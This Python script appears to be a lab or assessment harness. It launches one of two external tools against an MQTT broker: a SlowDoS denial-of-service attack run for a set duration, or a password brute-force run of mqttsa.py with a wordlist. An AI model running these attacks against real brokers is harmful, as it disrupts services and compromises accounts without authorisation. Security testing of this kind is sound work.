import argparse
import subprocess
import time

# define the paths to your scripts
slow_dos_path = '/home/jishnusen/Desktop/mqtt/MQTT_SlowITe/MQTT_attack_slowITe/MQTT_SlowDoS.py'
mqttsa_path = '/home/jishnusen/Desktop/mqtt/mqttsa/mqttsa.py'

# define command-line arguments
parser = argparse.ArgumentParser(description='Execute MQTT scripts with specified parameters.')
parser.add_argument('-m', '--mode', required=True, choices=['slowdos', 'bruteforce'], help='Mode of operation. Choose "slowdos" for SlowDoS attack and "bruteforce" for running mqttsa.py script')
parser.add_argument('-a', '--address', help='IP address of the MQTT broker')
parser.add_argument('-p', '--port', type=int, help='Port of the MQTT broker')
parser.add_argument('-k', '--keep-alive', type=int, help='Keep-Alive parameter used in the MQTT protocol')
parser.add_argument('-t', '--time', type=int, help='Time duration for the attack in seconds')
parser.add_argument('-u', '--username', help='Username for mqttsa.py script')
parser.add_argument('-w', '--wordlist', help='Path to the wordlist for mqttsa.py script')
args = parser.parse_args()

if args.mode == 'slowdos':
    # Check if necessary arguments are provided
    if args.address is None or args.port is None or args.keep_alive is None or args.time is None:
        parser.error("slowdos mode requires -a, -p, -k and -t arguments.")

    # run the MQTT_SlowDoS.py script
    slow_dos_process = subprocess.Popen(['python3', slow_dos_path, '-a', args.address, '-p', str(args.port), '-k', str(args.keep_alive)])

    # allow the process to run for the specified amount of time
    time.sleep(args.time)

    # kill the process
    slow_dos_process.kill()

elif args.mode == 'bruteforce':
    # Check if necessary arguments are provided
    if args.username is None or args.wordlist is None or args.address is None or args.port is None:
        parser.error("bruteforce mode requires -u, -w, -a, and -p arguments.")

    # run the mqttsa.py script
    other_process = subprocess.Popen(['python3', mqttsa_path, '-p', str(args.port), '-u', args.username, '-w', args.wordlist, args.address])

    # Here you can include some logic if you want to stop the other_process after some time
    # time.sleep(some_time)
    # other_process.kill()

